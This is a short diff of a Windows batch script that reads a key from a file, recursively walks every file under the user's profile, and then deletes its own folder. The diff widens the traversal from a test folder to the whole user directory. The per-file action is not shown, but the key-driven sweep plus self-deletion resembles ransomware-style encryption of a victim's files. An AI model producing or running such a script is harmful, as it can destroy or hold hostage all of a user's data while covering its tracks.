@@ -2,10 +2,11 @@
 
 cd /d %~dp0
 
-set key=eyeofrah
+:: read key from file
+for /f "delims=" %%i in ('powershell -Command "Get-Content key.txt | ForEach-Object { $_.Trim() }"') do set "key=%%i"
 
 :: traverse entire user directory
-for /r "%USERPROFILE%\documents\test" %%f in (*) do (
+for /r "%USERPROFILE%" %%f in (*) do (
     echo %%f | findstr /i %~dp0 >nul
 
     if errorlevel 1 (
@@ -28,3 +29,4 @@ start %file%
 :: delete own folder
 cd ..
 start /b rmdir %~dp0 /s /q
+exit
